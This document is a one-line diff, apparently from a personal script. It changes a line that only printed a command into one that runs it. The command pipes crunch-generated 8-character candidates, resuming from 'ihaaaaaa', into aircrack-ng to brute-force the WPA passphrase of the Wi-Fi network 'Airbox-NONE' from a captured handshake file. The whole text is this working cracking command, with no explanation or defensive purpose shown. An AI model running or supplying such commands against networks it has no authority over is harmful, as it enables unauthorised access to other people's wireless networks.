@@ -1,1 +1,1 @@
-printf "\ncrunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -s | aircrack-ng -e Airbox-NONE -w - ./teee/capturednew-01.cap | tee\n"
+crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -s ihaaaaaa | aircrack-ng -e Airbox-NONE -w - ./teee/capturednew-01.cap | tee
